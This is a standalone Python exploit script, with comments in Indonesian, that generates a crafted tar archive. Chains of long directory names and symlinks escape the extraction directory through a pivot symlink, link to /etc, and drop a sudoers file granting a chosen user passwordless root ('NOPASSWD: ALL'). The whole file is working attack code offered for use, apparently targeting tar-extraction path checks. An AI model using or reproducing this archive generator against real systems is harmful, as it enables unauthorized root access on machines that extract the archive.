#!/usr/bin/env python3
import argparse
import io
import os
import sys
import tarfile

IS_DARWIN = sys.platform == "darwin"
DIR_COMP_LEN = 55 if IS_DARWIN else 247
CHAIN_STEPS = "abcdefghijklmnop"
LONG_LINK_LEN = 254

def generate(output_path, target_user):
    target_file = f"/etc/sudoers.d/{target_user}"
    payload = f"{target_user} ALL=(ALL) NOPASSWD: ALL\n".encode()

    print(f"[*] Target user : {target_user}")
    print(f"[*] Target file : {target_file}")
    print(f"[*] Payload     : {payload.decode().strip()}")

    comp = "d" * DIR_COMP_LEN

    with tarfile.open(output_path, "w") as tar:
        inner_path = ""

        # Stage 1: buat chain direktori panjang + symlink pendek
        for step_char in CHAIN_STEPS:
            d_path = os.path.join(inner_path, comp)
            d = tarfile.TarInfo(name=d_path)
            d.type = tarfile.DIRTYPE
            d.mode = 0o755
            tar.addfile(d)

            s_path = os.path.join(inner_path, step_char)
            s = tarfile.TarInfo(name=s_path)
            s.type = tarfile.SYMTYPE
            s.linkname = comp
            tar.addfile(s)

            inner_path = d_path

        # Stage 2: pivot symlink
        short_chain = "/".join(CHAIN_STEPS)
        pivot_name = os.path.join(short_chain, "l" * LONG_LINK_LEN)

        pivot = tarfile.TarInfo(name=pivot_name)
        pivot.type = tarfile.SYMTYPE
        pivot.linkname = "../" * len(CHAIN_STEPS)
        tar.addfile(pivot)

        # Stage 3: escape symlink ke /etc
        escape_target = pivot_name + "/" + ("../" * 8) + "etc"

        esc = tarfile.TarInfo(name="escape")
        esc.type = tarfile.SYMTYPE
        esc.linkname = escape_target
        tar.addfile(esc)

        # Stage 4: tulis sudoers payload ke /etc/sudoers.d/wacky
        sudoers_dir = tarfile.TarInfo(name="escape/sudoers.d")
        sudoers_dir.type = tarfile.DIRTYPE
        sudoers_dir.mode = 0o755
        tar.addfile(sudoers_dir)

        final_path = f"escape/sudoers.d/{target_user}"
        p = tarfile.TarInfo(name=final_path)
        p.type = tarfile.REGTYPE
        p.mode = 0o440
        p.size = len(payload)
        tar.addfile(p, io.BytesIO(payload))

    print(f"[+] Wrote: {output_path}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-o", "--output", required=True)
    parser.add_argument("-u", "--user", default="wacky")
    args = parser.parse_args()
    generate(args.output, args.user)
